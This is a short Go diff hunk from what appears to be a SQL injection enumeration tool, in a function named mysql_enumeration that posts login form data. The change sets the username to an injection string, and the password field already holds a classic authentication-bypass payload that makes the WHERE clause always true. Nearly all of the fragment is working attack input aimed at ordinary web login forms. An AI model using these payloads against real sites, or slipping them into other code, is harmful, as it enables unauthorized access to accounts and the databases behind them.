@@ -78,7 +78,7 @@ func oracle_enumeration() {
 
 func mysql_enumeration() {
 	data := url.Values {
-		"username":		{"admin"},
+		"username":		{"admin'OR'1'-'1"},
 		"password":		{"test'OR'1'='1'-- "},
 	};
 	code, body := get_response(data);
